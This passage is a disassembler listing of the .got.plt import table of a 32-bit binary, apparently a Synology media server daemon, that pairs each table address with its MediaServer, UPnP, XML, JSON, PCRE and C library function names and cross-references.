.got.plt:080BA374 off_80BA374     dd offset _ZN11MediaServer23XMLGetFirstDocumentItemEP14_IXML_DocumentPKcPb
.got.plt:080BA374                                         ; DATA XREF: MediaServer::XMLGetFirstDocumentItem(_IXML_Document *,char  const*,bool *)r
.got.plt:080BA374                                         ; MediaServer::XMLGetFirstDocumentItem(_IXML_Document *,char  const*,bool *)
.got.plt:080BA378 off_80BA378     dd offset _ZN11MediaServer16DMSClientChecker13GetOffendCharEv
.got.plt:080BA378                                         ; DATA XREF: MediaServer::DMSClientChecker::GetOffendChar(void)r
.got.plt:080BA378                                         ; MediaServer::DMSClientChecker::GetOffendChar(void)
.got.plt:080BA37C off_80BA37C     dd offset _ZN11MediaServer13StringExplodeERKSsS1_
.got.plt:080BA37C                                         ; DATA XREF: MediaServer::StringExplode(std::string  const&,std::string  const&)r
.got.plt:080BA37C                                         ; MediaServer::StringExplode(std::string  const&,std::string  const&)
.got.plt:080BA380 off_80BA380     dd offset _ZNSt12__basic_fileIcED1Ev
.got.plt:080BA380                                         ; DATA XREF: std::__basic_file<char>::~__basic_file()r
.got.plt:080BA380                                         ; std::__basic_file<char>::~__basic_file()
.got.plt:080BA384 off_80BA384     dd offset syslog        ; DATA XREF: _syslogr
.got.plt:080BA388 off_80BA388     dd offset daemon        ; DATA XREF: _daemonr
.got.plt:080BA38C off_80BA38C     dd offset ixmlNamedNodeMap_free
.got.plt:080BA38C                                         ; DATA XREF: _ixmlNamedNodeMap_freer
.got.plt:080BA390 off_80BA390     dd offset _ZNSs6appendERKSs
.got.plt:080BA390                                         ; DATA XREF: std::string::append(std::string  const&)r
.got.plt:080BA390                                         ; std::string::append(std::string  const&)
.got.plt:080BA394 off_80BA394     dd offset _ZN11MediaServer12GetCoverListERSt6vectorISsSaISsEE
.got.plt:080BA394                                         ; DATA XREF: MediaServer::GetCoverList(std::vector<std::string,std::allocator<std::string>> &)r
.got.plt:080BA394                                         ; MediaServer::GetCoverList(std::vector<std::string,std::allocator<std::string>> &)
.got.plt:080BA398 off_80BA398     dd offset UpnpAddToActionResponse
.got.plt:080BA398                                         ; DATA XREF: _UpnpAddToActionResponser
.got.plt:080BA39C off_80BA39C     dd offset _ZN11MediaServer14DMSLOGSetLevelENS_12DMSLOG_LEVELE
.got.plt:080BA39C                                         ; DATA XREF: MediaServer::DMSLOGSetLevel(MediaServer::DMSLOG_LEVEL)r
.got.plt:080BA39C                                         ; MediaServer::DMSLOGSetLevel(MediaServer::DMSLOG_LEVEL)
.got.plt:080BA3A0 off_80BA3A0     dd offset _ZN11MediaServer7MediaDB7NextRowEv
.got.plt:080BA3A0                                         ; DATA XREF: MediaServer::MediaDB::NextRow(void)r
.got.plt:080BA3A0                                         ; MediaServer::MediaDB::NextRow(void)
.got.plt:080BA3A4 off_80BA3A4     dd offset _ZNSsD1Ev     ; DATA XREF: std::string::~string()r
.got.plt:080BA3A4                                         ; std::string::~string()
.got.plt:080BA3A8 off_80BA3A8     dd offset _ZN11MediaServer16DMSClientChecker19getVideoProfileNameEPK21__tag_SYNO_MEDIA_INFO
.got.plt:080BA3A8                                         ; DATA XREF: MediaServer::DMSClientChecker::getVideoProfileName(__tag_SYNO_MEDIA_INFO  const*)r
.got.plt:080BA3A8                                         ; MediaServer::DMSClientChecker::getVideoProfileName(__tag_SYNO_MEDIA_INFO  const*)
.got.plt:080BA3AC off_80BA3AC     dd offset __cxa_allocate_exception
.got.plt:080BA3AC                                         ; DATA XREF: ___cxa_allocate_exceptionr
.got.plt:080BA3B0 off_80BA3B0     dd offset UpnpNotify    ; DATA XREF: _UpnpNotifyr
.got.plt:080BA3B4 off_80BA3B4     dd offset _ZN11MediaServer24FileGetPathBaseNameNoExtERKSs
.got.plt:080BA3B4                                         ; DATA XREF: MediaServer::FileGetPathBaseNameNoExt(std::string  const&)r
.got.plt:080BA3B4                                         ; MediaServer::FileGetPathBaseNameNoExt(std::string  const&)
.got.plt:080BA3B8 off_80BA3B8     dd offset _ZN11MediaServer21DMSFormatUPNPDurationEi
.got.plt:080BA3B8                                         ; DATA XREF: MediaServer::DMSFormatUPNPDuration(int)r
.got.plt:080BA3B8                                         ; MediaServer::DMSFormatUPNPDuration(int)
.got.plt:080BA3BC off_80BA3BC     dd offset _ZN4Json5ValueC1Ei
.got.plt:080BA3BC                                         ; DATA XREF: Json::Value::Value(int)r
.got.plt:080BA3BC                                         ; Json::Value::Value(int)
.got.plt:080BA3C0 off_80BA3C0     dd offset ixmlNode_getNodeValue
.got.plt:080BA3C0                                         ; DATA XREF: _ixmlNode_getNodeValuer
.got.plt:080BA3C4 off_80BA3C4     dd offset _ZN11MediaServer18DMSGetProductModelEv
.got.plt:080BA3C4                                         ; DATA XREF: MediaServer::DMSGetProductModel(void)r
.got.plt:080BA3C4                                         ; MediaServer::DMSGetProductModel(void)
.got.plt:080BA3C8 off_80BA3C8     dd offset time          ; DATA XREF: _timer
.got.plt:080BA3CC off_80BA3CC     dd offset BlSYNOIndexIsRawImage
.got.plt:080BA3CC                                         ; DATA XREF: _BlSYNOIndexIsRawImager
.got.plt:080BA3D0 off_80BA3D0     dd offset _ZN11MediaServer15DMSStringBundle13ImportStringsEv
.got.plt:080BA3D0                                         ; DATA XREF: MediaServer::DMSStringBundle::ImportStrings(void)r
.got.plt:080BA3D0                                         ; MediaServer::DMSStringBundle::ImportStrings(void)
.got.plt:080BA3D4 off_80BA3D4     dd offset ixmlNodeList_item
.got.plt:080BA3D4                                         ; DATA XREF: _ixmlNodeList_itemr
.got.plt:080BA3D8 off_80BA3D8     dd offset pthread_mutex_lock
.got.plt:080BA3D8                                         ; DATA XREF: _pthread_mutex_lockr
.got.plt:080BA3DC off_80BA3DC     dd offset _ZN11MediaServer18FileGetPathDirNameERKSs
.got.plt:080BA3DC                                         ; DATA XREF: MediaServer::FileGetPathDirName(std::string  const&)r
.got.plt:080BA3DC                                         ; MediaServer::FileGetPathDirName(std::string  const&)
.got.plt:080BA3E0 off_80BA3E0     dd offset UpnpFinish    ; DATA XREF: _UpnpFinishr
.got.plt:080BA3E4 off_80BA3E4     dd offset _ZNSs4_Rep10_M_destroyERKSaIcE
.got.plt:080BA3E4                                         ; DATA XREF: std::string::_Rep::_M_destroy(std::allocator<char>  const&)r
.got.plt:080BA3E4                                         ; std::string::_Rep::_M_destroy(std::allocator<char>  const&)
.got.plt:080BA3E8 off_80BA3E8     dd offset _ZN14SynoAudioUtils9RadioInitEv
.got.plt:080BA3E8                                         ; DATA XREF: SynoAudioUtils::RadioInit(void)r
.got.plt:080BA3E8                                         ; SynoAudioUtils::RadioInit(void)
.got.plt:080BA3EC off_80BA3EC     dd offset ixmlNode_getNodeName
.got.plt:080BA3EC                                         ; DATA XREF: _ixmlNode_getNodeNamer
.got.plt:080BA3F0 off_80BA3F0     dd offset _ZN11MediaServer22DMSGetNetworkInterfaceERSt3mapISsSsSt4lessISsESaISt4pairIKSsSsEEE
.got.plt:080BA3F0                                         ; DATA XREF: MediaServer::DMSGetNetworkInterface(std::map<std::string,std::string,std::less<std::string>,std::allocator<std::pair<std::string  const,std::string>>> &)r
.got.plt:080BA3F0                                         ; MediaServer::DMSGetNetworkInterface(std::map<std::string,std::string,std::less<std::string>,std::allocator<std::pair<std::string  const,std::string>>> &)
.got.plt:080BA3F4 off_80BA3F4     dd offset strstr        ; DATA XREF: _strstrr
.got.plt:080BA3F8 off_80BA3F8     dd offset sleep         ; DATA XREF: _sleepr
.got.plt:080BA3FC off_80BA3FC     dd offset _ZN11MediaServer9XMLEscapeERKSsPKc
.got.plt:080BA3FC                                         ; DATA XREF: MediaServer::XMLEscape(std::string  const&,char  const*)r
.got.plt:080BA3FC                                         ; MediaServer::XMLEscape(std::string  const&,char  const*)
.got.plt:080BA400 off_80BA400     dd offset MediaInfoDBOpen ; DATA XREF: _MediaInfoDBOpenr
.got.plt:080BA404 off_80BA404     dd offset __strtol_internal
.got.plt:080BA404                                         ; DATA XREF: ___strtol_internalr
.got.plt:080BA408 off_80BA408     dd offset pthread_setspecific
.got.plt:080BA408                                         ; DATA XREF: _pthread_setspecificr
.got.plt:080BA40C off_80BA40C     dd offset pthread_key_create
.got.plt:080BA40C                                         ; DATA XREF: _pthread_key_creater
.got.plt:080BA410 off_80BA410     dd offset _ZNSsC1ERKSs  ; DATA XREF: std::string::string(std::string  const&)r
.got.plt:080BA410                                         ; std::string::string(std::string  const&)
.got.plt:080BA414 off_80BA414     dd offset UpnpAcceptSubscription
.got.plt:080BA414                                         ; DATA XREF: _UpnpAcceptSubscriptionr
.got.plt:080BA418 off_80BA418     dd offset __cxa_begin_catch
.got.plt:080BA418                                         ; DATA XREF: ___cxa_begin_catchr
.got.plt:080BA41C off_80BA41C     dd offset _ZN11MediaServer13DMSClientList11FindMacByIPERKSs
.got.plt:080BA41C                                         ; DATA XREF: MediaServer::DMSClientList::FindMacByIP(std::string  const&)r
.got.plt:080BA41C                                         ; MediaServer::DMSClientList::FindMacByIP(std::string  const&)
.got.plt:080BA420 off_80BA420     dd offset _Znaj         ; DATA XREF: operator new[](uint)r
.got.plt:080BA420                                         ; operator new[](uint)
.got.plt:080BA424 off_80BA424     dd offset _ZN14SynoAudioUtils19RadioGetStationDataEjjRNS_12RadioStationE
.got.plt:080BA424                                         ; DATA XREF: SynoAudioUtils::RadioGetStationData(uint,uint,SynoAudioUtils::RadioStation &)r
.got.plt:080BA424                                         ; SynoAudioUtils::RadioGetStationData(uint,uint,SynoAudioUtils::RadioStation &)
.got.plt:080BA428 off_80BA428     dd offset __xstat64     ; DATA XREF: ___xstat64r
.got.plt:080BA42C off_80BA42C     dd offset _ZSt18_Rb_tree_decrementPSt18_Rb_tree_node_base
.got.plt:080BA42C                                         ; DATA XREF: std::_Rb_tree_decrement(std::_Rb_tree_node_base *)r
.got.plt:080BA42C                                         ; std::_Rb_tree_decrement(std::_Rb_tree_node_base *)
.got.plt:080BA430 off_80BA430     dd offset _ZNSsC1EPKcRKSaIcE
.got.plt:080BA430                                         ; DATA XREF: std::string::string(char  const*,std::allocator<char>  const&)r
.got.plt:080BA430                                         ; std::string::string(char  const*,std::allocator<char>  const&)
.got.plt:080BA434 off_80BA434     dd offset initPQExpBuffer ; DATA XREF: _initPQExpBufferr
.got.plt:080BA438 off_80BA438     dd offset pcre_compile  ; DATA XREF: _pcre_compiler
.got.plt:080BA43C off_80BA43C     dd offset _ZN11MediaServer14DMSLOGGetLevelEv
.got.plt:080BA43C                                         ; DATA XREF: MediaServer::DMSLOGGetLevel(void)r
.got.plt:080BA43C                                         ; MediaServer::DMSLOGGetLevel(void)
.got.plt:080BA440 off_80BA440     dd offset SYNODBConnect ; DATA XREF: _SYNODBConnectr
.got.plt:080BA444 off_80BA444     dd offset _ZN11MediaServer16DMSClientCheckerC1ERKSsS2_b
.got.plt:080BA444                                         ; DATA XREF: MediaServer::DMSClientChecker::DMSClientChecker(std::string  const&,std::string  const&,bool)r
.got.plt:080BA444                                         ; MediaServer::DMSClientChecker::DMSClientChecker(std::string  const&,std::string  const&,bool)
.got.plt:080BA448 off_80BA448     dd offset _ZN14SynoAudioUtils12SmartPLSEnumEiiRiPKc
.got.plt:080BA448                                         ; DATA XREF: SynoAudioUtils::SmartPLSEnum(int,int,int &,char  const*)r
.got.plt:080BA448                                         ; SynoAudioUtils::SmartPLSEnum(int,int,int &,char  const*)
.got.plt:080BA44C off_80BA44C     dd offset _ZN11MediaServer13StringToLowerERKSs
.got.plt:080BA44C                                         ; DATA XREF: MediaServer::StringToLower(std::string  const&)r
.got.plt:080BA44C                                         ; MediaServer::StringToLower(std::string  const&)
.got.plt:080BA450 off_80BA450     dd offset __libc_start_main
.got.plt:080BA450                                         ; DATA XREF: ___libc_start_mainr
.got.plt:080BA454 off_80BA454     dd offset _ZN11MediaServer7MediaDB11SelectTotalEv
.got.plt:080BA454                                         ; DATA XREF: MediaServer::MediaDB::SelectTotal(void)r
.got.plt:080BA454                                         ; MediaServer::MediaDB::SelectTotal(void)
.got.plt:080BA458 off_80BA458     dd offset _ZN11MediaServer21DMSGetMediaFolderPathE21_tag_MEDIA_TABLE_TYPE
.got.plt:080BA458                                         ; DATA XREF: MediaServer::DMSGetMediaFolderPath(_tag_MEDIA_TABLE_TYPE)r
.got.plt:080BA458                                         ; MediaServer::DMSGetMediaFolderPath(_tag_MEDIA_TABLE_TYPE)
.got.plt:080BA45C off_80BA45C     dd offset _ZN11MediaServer13DMSClientList11WriteToFileEv
.got.plt:080BA45C                                         ; DATA XREF: MediaServer::DMSClientList::WriteToFile(void)r
.got.plt:080BA45C                                         ; MediaServer::DMSClientList::WriteToFile(void)
.got.plt:080BA460 off_80BA460     dd offset _ZSt18_Rb_tree_incrementPSt18_Rb_tree_node_base
.got.plt:080BA460                                         ; DATA XREF: std::_Rb_tree_increment(std::_Rb_tree_node_base *)r
.got.plt:080BA460                                         ; std::_Rb_tree_increment(std::_Rb_tree_node_base *)
.got.plt:080BA464 off_80BA464     dd offset _ZNSs14_M_replace_auxEjjjc
.got.plt:080BA464                                         ; DATA XREF: std::string::_M_replace_aux(uint,uint,uint,char)r
.got.plt:080BA464                                         ; std::string::_M_replace_aux(uint,uint,uint,char)
.got.plt:080BA468 off_80BA468     dd offset _ZN11MediaServer20XMLGetAttributeValueEP10_IXML_NodeRKSs
.got.plt:080BA468                                         ; DATA XREF: MediaServer::XMLGetAttributeValue(_IXML_Node *,std::string  const&)r
.got.plt:080BA468                                         ; MediaServer::XMLGetAttributeValue(_IXML_Node *,std::string  const&)
.got.plt:080BA46C off_80BA46C     dd offset _ZNSs6appendEPKcj
.got.plt:080BA46C                                         ; DATA XREF: std::string::append(char  const*,uint)r
.got.plt:080BA46C                                         ; std::string::append(char  const*,uint)
.got.plt:080BA470 off_80BA470     dd offset _Znwj         ; DATA XREF: operator new(uint)r
.got.plt:080BA470                                         ; operator new(uint)
.got.plt:080BA474 off_80BA474     dd offset UpnpSetWebServerRootDir
.got.plt:080BA474                                         ; DATA XREF: _UpnpSetWebServerRootDirr
.got.plt:080BA478 off_80BA478     dd offset _ZN11MediaServer7MediaDBD1Ev
.got.plt:080BA478                                         ; DATA XREF: MediaServer::MediaDB::~MediaDB()r
.got.plt:080BA478                                         ; MediaServer::MediaDB::~MediaDB()
.got.plt:080BA47C off_80BA47C     dd offset SLIBCStrTokIndex ; DATA XREF: _SLIBCStrTokIndexr
.got.plt:080BA480 off_80BA480     dd offset _ZN11MediaServer19XMLFindChildElementERKSsP10_IXML_Node
.got.plt:080BA480                                         ; DATA XREF: MediaServer::XMLFindChildElement(std::string  const&,_IXML_Node *)r
.got.plt:080BA480                                         ; MediaServer::XMLFindChildElement(std::string  const&,_IXML_Node *)
.got.plt:080BA484 off_80BA484     dd offset _ZNSt8ios_baseD2Ev
.got.plt:080BA484                                         ; DATA XREF: std::ios_base::~ios_base()r
.got.plt:080BA484                                         ; std::ios_base::~ios_base()
.got.plt:080BA488 off_80BA488     dd offset _ZSt29_Rb_tree_insert_and_rebalancebPSt18_Rb_tree_node_baseS0_RS_
.got.plt:080BA488                                         ; DATA XREF: std::_Rb_tree_insert_and_rebalance(bool,std::_Rb_tree_node_base *,std::_Rb_tree_node_base *,std::_Rb_tree_node_base&)r
.got.plt:080BA488                                         ; std::_Rb_tree_insert_and_rebalance(bool,std::_Rb_tree_node_base *,std::_Rb_tree_node_base *,std::_Rb_tree_node_base&)
.got.plt:080BA48C off_80BA48C     dd offset _ZN4Json5ValueaSERKS0_
.got.plt:080BA48C                                         ; DATA XREF: Json::Value::operator=(Json::Value const&)r
.got.plt:080BA48C                                         ; Json::Value::operator=(Json::Value const&)
.got.plt:080BA490 off_80BA490     dd offset _ZN11MediaServer10DMSLOGInitEPKc
.got.plt:080BA490                                         ; DATA XREF: MediaServer::DMSLOGInit(char  const*)r
.got.plt:080BA490                                         ; MediaServer::DMSLOGInit(char  const*)
.got.plt:080BA494 off_80BA494     dd offset MediaInfoDBGet ; DATA XREF: _MediaInfoDBGetr
.got.plt:080BA498 off_80BA498     dd offset fclose        ; DATA XREF: _fcloser
.got.plt:080BA49C off_80BA49C     dd offset _ZNSt9basic_iosIcSt11char_traitsIcEE5clearESt12_Ios_Iostate
.got.plt:080BA49C                                         ; DATA XREF: std::basic_ios<char,std::char_traits<char>>::clear(std::_Ios_Iostate)r
.got.plt:080BA49C                                         ; std::basic_ios<char,std::char_traits<char>>::clear(std::_Ios_Iostate)
.got.plt:080BA4A0 off_80BA4A0     dd offset strrchr       ; DATA XREF: _strrchrr
.got.plt:080BA4A4 off_80BA4A4     dd offset SYNONetGetCard1 ; DATA XREF: _SYNONetGetCard1r
.got.plt:080BA4A8 off_80BA4A8     dd offset _ZN11MediaServer21GetIndexLoacationPathERK21_tag_MEDIA_TABLE_TYPE
.got.plt:080BA4A8                                         ; DATA XREF: MediaServer::GetIndexLoacationPath(_tag_MEDIA_TABLE_TYPE  const&)r
.got.plt:080BA4A8                                         ; MediaServer::GetIndexLoacationPath(_tag_MEDIA_TABLE_TYPE  const&)
.got.plt:080BA4AC off_80BA4AC     dd offset _ZN11MediaServer9DMSPrintfENS_12DMSLOG_LEVELEPKcz
.got.plt:080BA4AC                                         ; DATA XREF: MediaServer::DMSPrintf(MediaServer::DMSLOG_LEVEL,char  const*,...)r
.got.plt:080BA4AC                                         ; MediaServer::DMSPrintf(MediaServer::DMSLOG_LEVEL,char  const*,...)
.got.plt:080BA4B0 off_80BA4B0     dd offset fopen64       ; DATA XREF: _fopen64r
.got.plt:080BA4B4 off_80BA4B4     dd offset UpnpGetServerPort
.got.plt:080BA4B4                                         ; DATA XREF: _UpnpGetServerPortr
.got.plt:080BA4B8 off_80BA4B8     dd offset _ZN14SynoAudioUtils14RadioGetGenresEiiRSt6vectorINS_10RadioGenreESaIS1_EERi
.got.plt:080BA4B8                                         ; DATA XREF: SynoAudioUtils::RadioGetGenres(int,int,std::vector<SynoAudioUtils::RadioGenre,std::allocator<SynoAudioUtils::RadioGenre>> &,int &)r
.got.plt:080BA4B8                                         ; SynoAudioUtils::RadioGetGenres(int,int,std::vector<SynoAudioUtils::RadioGenre,std::allocator<SynoAudioUtils::RadioGenre>> &,int &)
.got.plt:080BA4BC off_80BA4BC     dd offset _ZN11MediaServer16XMLEnumTagValuesEP10_IXML_NodeRKSs
.got.plt:080BA4BC                                         ; DATA XREF: MediaServer::XMLEnumTagValues(_IXML_Node *,std::string  const&)r
.got.plt:080BA4BC                                         ; MediaServer::XMLEnumTagValues(_IXML_Node *,std::string  const&)
.got.plt:080BA4C0 off_80BA4C0     dd offset snprintf      ; DATA XREF: _snprintfr
.got.plt:080BA4C4 off_80BA4C4     dd offset gethostname   ; DATA XREF: _gethostnamer
.got.plt:080BA4C8 off_80BA4C8     dd offset _ZN11MediaServer16DMSClientChecker15InitProfileListERKSs
.got.plt:080BA4C8                                         ; DATA XREF: MediaServer::DMSClientChecker::InitProfileList(std::string  const&)r
.got.plt:080BA4C8                                         ; MediaServer::DMSClientChecker::InitProfileList(std::string  const&)
.got.plt:080BA4CC off_80BA4CC     dd offset __cxa_pure_virtual
.got.plt:080BA4CC                                         ; DATA XREF: ___cxa_pure_virtualr
.got.plt:080BA4D0 off_80BA4D0     dd offset strcasecmp    ; DATA XREF: _strcasecmpr
.got.plt:080BA4D4 off_80BA4D4     dd offset mkstemp64     ; DATA XREF: _mkstemp64r
.got.plt:080BA4D8 off_80BA4D8     dd offset inet_ntop     ; DATA XREF: _inet_ntopr
.got.plt:080BA4DC off_80BA4DC     dd offset _ZSt20__throw_length_errorPKc
.got.plt:080BA4DC                                         ; DATA XREF: std::__throw_length_error(char  const*)r
.got.plt:080BA4DC                                         ; std::__throw_length_error(char  const*)
.got.plt:080BA4E0 off_80BA4E0     dd offset _ZdaPv        ; DATA XREF: operator delete[](void *)r
.got.plt:080BA4E0                                         ; operator delete[](void *)
.got.plt:080BA4E4 off_80BA4E4     dd offset exit          ; DATA XREF: _exitr
.got.plt:080BA4E8 off_80BA4E8     dd offset ixmlNode_getNodeType
.got.plt:080BA4E8                                         ; DATA XREF: _ixmlNode_getNodeTyper
.got.plt:080BA4EC off_80BA4EC     dd offset UpnpSetDescURL ; DATA XREF: _UpnpSetDescURLr
.got.plt:080BA4F0 off_80BA4F0     dd offset _ZNSs6assignERKSs
.got.plt:080BA4F0                                         ; DATA XREF: std::string::assign(std::string  const&)r
.got.plt:080BA4F0                                         ; std::string::assign(std::string  const&)
.got.plt:080BA4F4 off_80BA4F4     dd offset _ZN11MediaServer18SQLEscapeConditionERKSs
.got.plt:080BA4F4                                         ; DATA XREF: MediaServer::SQLEscapeCondition(std::string  const&)r
.got.plt:080BA4F4                                         ; MediaServer::SQLEscapeCondition(std::string  const&)
.got.plt:080BA4F8 off_80BA4F8     dd offset _ZN11MediaServer15SQLEscapeStringERKSs
.got.plt:080BA4F8                                         ; DATA XREF: MediaServer::SQLEscapeString(std::string  const&)r
.got.plt:080BA4F8                                         ; MediaServer::SQLEscapeString(std::string  const&)
.got.plt:080BA4FC off_80BA4FC     dd offset SLIBNetGetInterfaceInfo
.got.plt:080BA4FC                                         ; DATA XREF: _SLIBNetGetInterfaceInfor
.got.plt:080BA500 off_80BA500     dd offset free          ; DATA XREF: _freer
.got.plt:080BA504 off_80BA504     dd offset _ZN11MediaServer9URLEncodeERKSs
.got.plt:080BA504                                         ; DATA XREF: MediaServer::URLEncode(std::string  const&)r
.got.plt:080BA504                                         ; MediaServer::URLEncode(std::string  const&)
.got.plt:080BA508 off_80BA508     dd offset _ZNSs12_M_leak_hardEv
.got.plt:080BA508                                         ; DATA XREF: std::string::_M_leak_hard(void)r
.got.plt:080BA508                                         ; std::string::_M_leak_hard(void)
.got.plt:080BA50C off_80BA50C     dd offset _ZN11MediaServer13StringReplaceESsSsSs
.got.plt:080BA50C                                         ; DATA XREF: MediaServer::StringReplace(std::string,std::string,std::string)r
.got.plt:080BA50C                                         ; MediaServer::StringReplace(std::string,std::string,std::string)
.got.plt:080BA510 off_80BA510     dd offset ixmlLoadDocumentEx
.got.plt:080BA510                                         ; DATA XREF: _ixmlLoadDocumentExr
.got.plt:080BA514 off_80BA514     dd offset pcre_study    ; DATA XREF: _pcre_studyr
.got.plt:080BA518 off_80BA518     dd offset UpnpRegisterRootDevice
.got.plt:080BA518                                         ; DATA XREF: _UpnpRegisterRootDevicer
.got.plt:080BA51C off_80BA51C     dd offset _ZN14SynoAudioUtils16RadioGetStationsEjiiRSt6vectorINS_12RadioStationESaIS1_EERi
.got.plt:080BA51C                                         ; DATA XREF: SynoAudioUtils::RadioGetStations(uint,int,int,std::vector<SynoAudioUtils::RadioStation,std::allocator<SynoAudioUtils::RadioStation>> &,int &)r
.got.plt:080BA51C                                         ; SynoAudioUtils::RadioGetStations(uint,int,int,std::vector<SynoAudioUtils::RadioStation,std::allocator<SynoAudioUtils::RadioStation>> &,int &)
.got.plt:080BA520 off_80BA520     dd offset memset        ; DATA XREF: _memsetr
.got.plt:080BA524 off_80BA524     dd offset _ZSt20__throw_out_of_rangePKc
.got.plt:080BA524                                         ; DATA XREF: std::__throw_out_of_range(char  const*)r
.got.plt:080BA524                                         ; std::__throw_out_of_range(char  const*)
.got.plt:080BA528 off_80BA528     dd offset strncasecmp   ; DATA XREF: _strncasecmpr
.got.plt:080BA52C off_80BA52C     dd offset _ZN4Json5ValueD1Ev
.got.plt:080BA52C                                         ; DATA XREF: Json::Value::~Value()r
.got.plt:080BA52C                                         ; Json::Value::~Value()
.got.plt:080BA530 off_80BA530     dd offset _ZN7pcrecpp3Arg12parse_stringEPKciPv
.got.plt:080BA530                                         ; DATA XREF: .plt:pcrecpp::Arg::parse_string(char  const*,int,void *)r
.got.plt:080BA530                                         ; pcrecpp::Arg::parse_string(char  const*,int,void *)
.got.plt:080BA534 off_80BA534     dd offset ixmlNamedNodeMap_getNamedItem
.got.plt:080BA534                                         ; DATA XREF: _ixmlNamedNodeMap_getNamedItemr
.got.plt:080BA538 off_80BA538     dd offset _ZNSs6assignEPKcj
.got.plt:080BA538                                         ; DATA XREF: std::string::assign(char  const*,uint)r
.got.plt:080BA538                                         ; std::string::assign(char  const*,uint)
.got.plt:080BA53C off_80BA53C     dd offset _ZN11MediaServer7MediaDB20AddExcludeVideoCodecESs
.got.plt:080BA53C                                         ; DATA XREF: MediaServer::MediaDB::AddExcludeVideoCodec(std::string)r
.got.plt:080BA53C                                         ; MediaServer::MediaDB::AddExcludeVideoCodec(std::string)
.got.plt:080BA540 off_80BA540     dd offset lseek64       ; DATA XREF: _lseek64r
.got.plt:080BA544 off_80BA544     dd offset _ZNSt9basic_iosIcSt11char_traitsIcEE4initEPSt15basic_streambufIcS1_E
.got.plt:080BA544                                         ; DATA XREF: std::basic_ios<char,std::char_traits<char>>::init(std::basic_streambuf<char,std::char_traits<char>> *)r
.got.plt:080BA544                                         ; std::basic_ios<char,std::char_traits<char>>::init(std::basic_streambuf<char,std::char_traits<char>> *)
.got.plt:080BA548 off_80BA548     dd offset _ZN7pcrecpp2RED1Ev
.got.plt:080BA548                                         ; DATA XREF: pcrecpp::RE::~RE()r
.got.plt:080BA548                                         ; pcrecpp::RE::~RE()
.got.plt:080BA54C off_80BA54C     dd offset _Unwind_Resume ; DATA XREF: __Unwind_Resumer
.got.plt:080BA550 off_80BA550     dd offset _ZN11MediaServer14FileGetFileExtERKSs
.got.plt:080BA550                                         ; DATA XREF: MediaServer::FileGetFileExt(std::string  const&)r
.got.plt:080BA550                                         ; MediaServer::FileGetFileExt(std::string  const&)
.got.plt:080BA554 off_80BA554     dd offset _ZN11MediaServer19FileGetPathBaseNameERKSs
.got.plt:080BA554                                         ; DATA XREF: MediaServer::FileGetPathBaseName(std::string  const&)r
.got.plt:080BA554                                         ; MediaServer::FileGetPathBaseName(std::string  const&)
.got.plt:080BA558 off_80BA558     dd offset __strtoul_internal
.got.plt:080BA558                                         ; DATA XREF: ___strtoul_internalr
.got.plt:080BA55C off_80BA55C     dd offset UpnpSetMaxContentLength
.got.plt:080BA55C                                         ; DATA XREF: _UpnpSetMaxContentLengthr
.got.plt:080BA560 off_80BA560     dd offset _ZN11MediaServer7MediaDB14FetchMediaItemER21__tag_SYNO_MEDIA_INFO
.got.plt:080BA560                                         ; DATA XREF: MediaServer::MediaDB::FetchMediaItem(__tag_SYNO_MEDIA_INFO &)r
.got.plt:080BA560                                         ; MediaServer::MediaDB::FetchMediaItem(__tag_SYNO_MEDIA_INFO &)
.got.plt:080BA564 off_80BA564     dd offset _ZNKSs5rfindEcj
.got.plt:080BA564                                         ; DATA XREF: std::string::rfind(char,uint)r
.got.plt:080BA564                                         ; std::string::rfind(char,uint)
.got.plt:080BA568 off_80BA568     dd offset SYNOPlaylistRecFree
.got.plt:080BA568                                         ; DATA XREF: _SYNOPlaylistRecFreer
.got.plt:080BA56C off_80BA56C     dd offset pthread_mutex_unlock
.got.plt:080BA56C                                         ; DATA XREF: _pthread_mutex_unlockr
.got.plt:080BA570 off_80BA570     dd offset ixmlDocument_getElementsByTagName
.got.plt:080BA570                                         ; DATA XREF: _ixmlDocument_getElementsByTagNamer
.got.plt:080BA574 off_80BA574     dd offset _ZN11MediaServer7MediaDB6SelectERKSsS2_iiS2_
.got.plt:080BA574                                         ; DATA XREF: MediaServer::MediaDB::Select(std::string  const&,std::string  const&,int,int,std::string  const&)r
.got.plt:080BA574                                         ; MediaServer::MediaDB::Select(std::string  const&,std::string  const&,int,int,std::string  const&)
.got.plt:080BA578 off_80BA578     dd offset ixmlNodeList_free
.got.plt:080BA578                                         ; DATA XREF: _ixmlNodeList_freer
.got.plt:080BA57C off_80BA57C     dd offset __cxa_throw   ; DATA XREF: ___cxa_throwr
.got.plt:080BA580 off_80BA580     dd offset _ZN4Json5ValueixEPKc
.got.plt:080BA580                                         ; DATA XREF: Json::Value::operator[](char  const*)r
.got.plt:080BA580                                         ; Json::Value::operator[](char  const*)
.got.plt:080BA584 off_80BA584     dd offset printfPQExpBuffer
.got.plt:080BA584                                         ; DATA XREF: _printfPQExpBufferr
.got.plt:080BA588 off_80BA588     dd offset UpnpAddVirtualDir
.got.plt:080BA588                                         ; DATA XREF: _UpnpAddVirtualDirr
.got.plt:080BA58C off_80BA58C     dd offset _ZN11MediaServer13DMSClientList7FindKeyERKSsS2_
.got.plt:080BA58C                                         ; DATA XREF: MediaServer::DMSClientList::FindKey(std::string  const&,std::string  const&)r
.got.plt:080BA58C                                         ; MediaServer::DMSClientList::FindKey(std::string  const&,std::string  const&)
.got.plt:080BA590 off_80BA590     dd offset _ZN11MediaServer7MediaDBC1E21_tag_MEDIA_TABLE_TYPEP13DBConnect_tag
.got.plt:080BA590                                         ; DATA XREF: MediaServer::MediaDB::MediaDB(_tag_MEDIA_TABLE_TYPE,DBConnect_tag *)r
.got.plt:080BA590                                         ; MediaServer::MediaDB::MediaDB(_tag_MEDIA_TABLE_TYPE,DBConnect_tag *)
.got.plt:080BA594 off_80BA594     dd offset _ZN11MediaServer16DMSClientChecker17ReleaseClientListEv
.got.plt:080BA594                                         ; DATA XREF: MediaServer::DMSClientChecker::ReleaseClientList(void)r
.got.plt:080BA594                                         ; MediaServer::DMSClientChecker::ReleaseClientList(void)
.got.plt:080BA598 off_80BA598     dd offset _ZN4Json18StyledStreamWriter5writeERSoRKNS_5ValueE
.got.plt:080BA598                                         ; DATA XREF: Json::StyledStreamWriter::write(std::ostream &,Json::Value  const&)r
.got.plt:080BA598                                         ; Json::StyledStreamWriter::write(std::ostream &,Json::Value  const&)
.got.plt:080BA59C off_80BA59C     dd offset _ZN11MediaServer13StringImplodeERKSt6vectorISsSaISsEEPKc
